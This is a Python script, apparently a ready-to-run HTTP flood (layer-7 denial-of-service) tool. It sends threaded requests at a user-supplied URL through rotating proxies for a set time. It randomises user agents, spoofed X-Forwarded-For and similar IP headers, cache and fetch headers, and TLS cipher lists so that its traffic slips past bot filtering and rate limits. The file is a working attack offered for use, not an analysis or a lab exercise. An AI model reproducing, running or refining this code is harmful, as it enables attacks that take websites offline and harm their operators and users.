import threading
import requests
import time
from itertools import cycle 
import random 
class Attacker:
	def __init__(self, file_path):
		self.proxies = self.read_attacker(file_path)
		self.proxy_cycle = cycle(self.proxies)
	def read_attacker(self, file_path):
		attackers = []
		with open(file_path, 'r') as file:
			for line in file:
				attackers.append(line.strip())
		return attackers
	def reqProxy(self, url, headers=None, ciphers=None, tls_params=None, timeout=None, num_threads=1):
		threads = []
		for _ in range(num_threads):
			thread = threading.Thread(target=self.send_request_using_proxy, args=(url, headers, ciphers, tls_params, timeout))
			thread.start()
			threads.append(thread)
		for thread in threads:
			thread.join()
	def send_request_using_proxy(self, url, headers=None, ciphers=None, tls_params=None, timeout=None):
		# while True:
		proxy = next(self.proxy_cycle)
		try:
			session = requests.Session()
			if ciphers:
				session.adapters.DEFAULT_CIPHERS = ciphers
			if tls_params:
				session.mount("https://", requests.adapters.HTTPAdapter(max_retries=tls_params))
			response = session.get(url, proxies={'http': proxy, 'https': proxy}, headers=headers, timeout=timeout)
			# print(f"Response from {url} via {proxy}: {response.status_code}")
		except requests.exceptions.RequestException as e:
			pass
			# print(f"Error while sending request to {url} via {proxy}: {e}")             

class Timer:
	def __init__(self, duration):
		self.duration = duration
	def run(self, code):
		start_time = time.time()
		while time.time() - start_time < self.duration:
			code()
		print("Attack done.")
attacker_file_path = input("file prx: ") #'a.txt'
from fake_useragent import UserAgent
def randua():
    ua = UserAgent()
    return ua.random 
def ahaha():
	acp= [
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
	 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
	  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
	'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
	'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
	 ]
	randhaha=random.choices(acp)
	return randhaha
def langu():
	languages = [
	    'en;q=0.9',
	    'en-GB',
	    'en-US;q=0.8',
	    'fr-FR',
	    'fr-CA;q=0.7',
	    'de-DE',
	    'es-ES;q=0.5',
	    'es-MX',
	    'pt-BR;q=0.6',
	    'it-IT',
	    'nl-NL;q=0.4',
	    'sv-SE',
	    'no-NO;q=0.3',
	    'da-DK',
	    'fi-FI;q=0.2',
	    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
	    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
	    'en-US,en;q=0.5',
	    'en-US,en;q=0.9',
	    'de-CH;q=0.7',
	    'da, en-gb;q=0.8, en;q=0.7',
	    'cs;q=0.5'
	    'ja-JP',
	    'ko-KR',
	    'zh-CN',
	    'zh-TW',
	    'cs-CZ;q=0.1',
	    'pl-PL',
	    'hu-HU',
	    'ru-RU',
	    'tr-TR',
	    'ar-SA',
	    'he-IL',
	    'hi-IN;q=0.7',
	    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
	'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
	    #Thêm các ngôn ngữ và giá trị 'q' tùy chỉnh khác
	]
	accept_languages = random.choices(languages, k=40)
	return accept_languages
def ipfd():
	forwarded_for_ips = ['0.0.0.0','192.168.0.1', '10.0.0.1', '172.16.0.1', '203.0.113.1', '198.51.100.1', '192.0.2.1', '128.0.0.1', '172.31.0.1', '240.0.0.1', '127.0.0.1', '169.254.1.1', '100.64.0.1', '103.52.120.0', '45.56.120.20', '79.34.56.178', '112.204.23.186', '217.195.102.124', '51.68.214.206', '98.143.144.86', '182.168.20.193', '62.171.177.101', '123.45.67.89', '203.0.113.55', '1.1.1.1', '1.0.0.1', '127.0.0.1',]
	return random.choice(forwarded_for_ips)
def xrqd():
    headers = ['XMLHttpRequest', 'Fetch', 'jQuery', 'Axios']
    random_header = random.choice(headers)
    return random_header
def henc():
    headers = ['gzip', 'deflate', 'br', 'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*']
    random_headers = random.choice(headers)
    return random_headers
def xport():
	prt=['80', '443', '8443', '8080', '4443', '53',]
	choi=random.choice(prt)
	return choi
def ctrol():
    cache_controls = ['public', 'private', 'no-cache', 'no-store', 'max-age', 's-maxage', 'must-revalidate', 'proxy-revalidate', 'no-transform']
    random_cache_control = random.choice(cache_controls)
    return random_cache_control
def pregnant():
    pragma_values = [
        'no-cache', 'no-store', 'only-if-cached', 'public', 'private',
        'max-age=3600', 'immutable', 'no-transform', 'must-revalidate', 
        'proxy-revalidate', 'no-check', 'refresh', 'stale-while-revalidate=3600'
        '*/*',
		'max-age=604800',
		'no-cache',
		'no-store',
		'no-transform',
		'only-if-cached',
		'max-age=0',
		'max-age=0, private, must-revalidate',
		'no-cache, no-store, private, max-age=0, must-revalidate',
		'no-cache, no-store, private, s-maxage=604800, must-revalidate',
		'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
		'no-cache, no-store, max-age=0, must-revalidate',
		'no-store, no-cache, must-revalidate',
		'public, max-age=0, s-maxage=3600, must-revalidate, stale-while-revalidate=28800',
		'no-cache, no-store, private, max-age=604800, must-revalidate',
    ]
    random_pragma = random.choice(pragma_values)
    return random_pragma
    
def cp():
    cplist=[
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:ECDHE-RSA-AES256-SHA:CAMELLIA256-SHA:AES256-SHA256:AES256-SHA:CAMELLIA128-SHA:AES128-SHA256:AES128-SHA:DES-CBC3-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-RSA-CAMELLIA256-SHA:CAMELLIA256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-CAMELLIA256-SHA:AES256-SHA256:AES256-SHA:AES128-SHA256',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-RSA-CAMELLIA256-SHA:CAMELLIA256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-CAMELLIA256-SHA:AES256-SHA256:AES256-SHA:DES-CBC3-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-RSA-CAMELLIA256-SHA:CAMELLIA256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:CAMELLIA128-SHA:AES128-SHA256:AES128-SHA:DES-CBC3-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-RSA-CAMELLIA256-SHA:CAMELLIA256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-CAMELLIA128-SHA:AES128-SHA256:AES128-SHA:DES-CBC3-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-RSA-CAMELLIA256-SHA:CAMELLIA256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:CAMELLIA128-SHA:AES128-SHA256:AES128-SHA:DES-CBC3-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:ECDHE-RSA-AES256-SHA:CAMELLIA256-SHA:AES256-SHA256:AES256-SHA:DES-CBC3-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:RC4-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:ECDHE-RSA-AES256-SHA:CAMELLIA256-SHA:AES256-SHA256:AES256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DES-CBC3-SHA:RC4-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:ECDHE-RSA-AES256-SHA:CAMELLIA256-SHA:AES256-SHA256:AES256-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:DES-CBC3-SHA:RC4-SHA',
'ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:ECDHE-RSA-AES256-SHA:CAMELLIA256-SHA:AES256-SHA256:AES256-SHA:CAMELLIA128-SHA:AES128-SHA256:AES128-SHA:DES-CBC3-SHA',
    ]
    dhk=random.choice(cplist)
    return dhk
def rcone():
    connections = [
        'keep-alive',
        'close',
        'upgrade',
        'TE',
        'trailers',
        'WebSocket',
        'HTTP2-Settings',
        'DNT',
        'Authorization',
        'Proxy-Authorization',
        'X-Custom-Header',
        # Thêm các giá trị khác tùy vào nhu cầu
    ]
    random_connection = random.choice(connections)
    return random_connection
def headers_shit():
	ahahaa=str(ahaha())
	randuas=str(randua())
	rcones=str(rcone())
	langus=str(langu())
	xrqds=str(xrqd())
	hencs=str(henc())
	ipfds=str(ipfd())
	xht=str(random.choice(['http', 'https',]))
	xports=str(xport())
	ctrolshit=str(ctrol())
	pregnantj=str(pregnant())
	dnt_shit= str(random.choice(['0', '1']))
	trailer_shit= str(random.choice(['trailers', 'gzip', 'deflate']))
	fuckyou=str(random.choice(['document', 'image', 'script', 'style', 'font']))
	shitheader=str(random.choice(['navigate', 'cors', 'no-cors', 'same-origin']))
	damnmtf= str(random.choice(['same-origin', 'cross-site']))
	shitfetch=str(random.choice(['?1', '?0']))
	headers = {
	'User-Agent': randuas,
	'Accept-Language': langus, #90
	'Referer': ipfds, #50
	'Accept': ahahaa,
	'Accept-Encoding': hencs, #done
	'Upgrade-Insecure-Requests': '1',
	'Cache-Control': ctrolshit,
	'DNT': dnt_shit,
	'TE': trailer_shit,
	'Sec-Fetch-Dest': fuckyou,
	'Sec-Fetch-Mode': shitheader,
	'Sec-Fetch-Site': damnmtf,
	'Sec-Fetch-User': shitfetch,
	'Connection': rcones, #ok
	'Pragma': pregnantj,
	'Authority': ipfds,
	'Origin': ipfds,
	'Content-Type': 'application/json',
	# 'Cookie': 'your-cookie-value', #ok
	'X-Requested-With': xrqds, #done +1
	'X-Forwarded-For': ipfds, #done
	'X-Forwarded-Proto': xht,
	'X-Forwarded-Host': ipfds,
	'X-Forwarded-Port': xports,
	'X-Originating-IP': ipfds,
	'X-Remote-IP': ipfds, 
	'X-Remote-Addr': ipfds,
	# 'X-True-IP': ipfd,
	'Redirect': ipfds,
	}
	return headers
url=input("url: ")
# url = sys.argv[2]
import sys
# argument_2 = sys.argv[2]
#print(argument_2)
#ciphers = 
tls_params = 1
timeout = 12
num_threads = int(input("thread: "))
attacker = Attacker(attacker_file_path)
timeinh= int(input("time: "))# sys.argv[3] # int(input("time: "))
timer = Timer(timeinh)
print("script by canhcutkhongbay")
timer.run(lambda: attacker.reqProxy(url, headers=headers_shit(), ciphers=cp(), tls_params=tls_params, timeout=timeout, num_threads=num_threads))
